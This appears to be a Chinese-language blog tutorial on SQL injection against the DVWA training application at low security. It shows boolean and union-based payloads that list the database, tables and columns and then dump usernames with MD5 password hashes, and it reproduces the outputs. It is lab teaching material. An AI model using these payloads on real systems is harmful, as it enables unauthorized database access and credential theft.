---
title: 简单的SQL注入 -- dvwa
tag: 信息安全
date: 2021/04/08
---

# 简单的SQL注入 -- dvwa

>  **以 `dvwa`的 `low-level`为例**


## 布尔注入

### Injection Code

```sql
' or 1 = 1 # 
```

### Result

这里可以查出其他用户的一些信息

```
ID: ' or 1 =1 # 
First name: admin
Surname: admin
ID: ' or 1 =1 # 
First name: Gordon
Surname: Brown
ID: ' or 1 =1 # 
First name: Hack
Surname: Me
ID: ' or 1 =1 # 
First name: Pablo
Surname: Picasso
ID: ' or 1 =1 # 
First name: Bob
Surname: Smith
```
## 联合注入

**如果我们需要更多信息，可以考虑联合注入，主要是以下几步**

1. 确定字段数
2. 找到数据库名称
3. 找到数据库内的表名
4. 找到表的字段
5. 找到敏感信息

### 1.确定字段数

#### Injection Code

```sql
' union select 1 # 
```

```sql
' union select 1, 2 # 
```

……

简单的可以通过报错信息来试出有多少个字段

#### Result (错误信息)

```
The used SELECT statements have a different number of columns
```

#### Result (正确信息)

```
ID: ' union select 1, 2 # 
First name: 1
Surname: 2
```

### 2. 找到数据库名称

#### Injection Code

```sql
 ' union select 1, database() # 
```

因为有两个字段，所以要写个`1`来占位

#### Result

```
ID:  ' union select 1, database() # 
First name: 1
Surname: dvwa
```

这里可以看到我们的数据库名叫`dvwa`

### 3. 找到数据库内的表名

#### Injection Code

```sql
' union select 1, table_name from information_schema.tables where table_schema = 'dvwa' #
```

`table_name`记录了表的名字，`table_schema`记录的是数据库的名字，这些信息记录在`information_schema`的`tables`里面。

#### Result Code

```
ID: ' union select 1, table_name from information_schema.tables where table_schema = 'dvwa' #
First name: 1
Surname: guestbook
ID: ' union select 1, table_name from information_schema.tables where table_schema = 'dvwa' #
First name: 1
Surname: users
```

### 4. 找到表的字段

#### Injection Code

```sql
' union select 1, column_name from information_schema.columns  where table_name='users' #
```

`column_name`是表的字段名，`table_name`是表名

#### Result

```
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: user_id
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: first_name
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: last_name
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: user
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: password
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: avatar
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: last_login
ID: ' union select 1, column_name from information_schema.columns  where table_name='users' #
First name: 1
Surname: failed_login
```

这里简单整理一下，就可以获得这张表的字段如下：

| user_id | first_name | last_name | user | password | avatar | last_login | failed_login |
| ------- | ---------- | --------- | ---- | -------- | ------ | ---------- | ------------ |

### 5. 找到敏感信息

#### Injection Code

```sql
 ' union select user_id, concat(user,'\t', password) from dvwa.users #
```

如果要查多个字段的话，可以用 `concat`函数，中间可以用`"\t"`连接

#### Result

```
ID: ' union select user_id, concat(user,'\t', password) from dvwa.users #
First name: 1
Surname: admin	5f4dcc3b5aa765d61d8327deb882cf99
ID: ' union select user_id, concat(user,'\t', password) from dvwa.users #
First name: 2
Surname: gordonb	e99a18c428cb38d5f260853678922e03
ID: ' union select user_id, concat(user,'\t', password) from dvwa.users #
First name: 3
Surname: 1337	8d3533d75ae2c3966d7e0d4fcc69216b
ID: ' union select user_id, concat(user,'\t', password) from dvwa.users #
First name: 4
Surname: pablo	0d107d09f5bbe40cade3de5c71e9e9b7
ID: ' union select user_id, concat(user,'\t', password) from dvwa.users #
First name: 5
Surname: smithy	5f4dcc3b5aa765d61d8327deb882cf99
```

| user_id | user    | password(经过加密，不能看到明文) |
| ------- | ------- | -------------------------------- |
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |

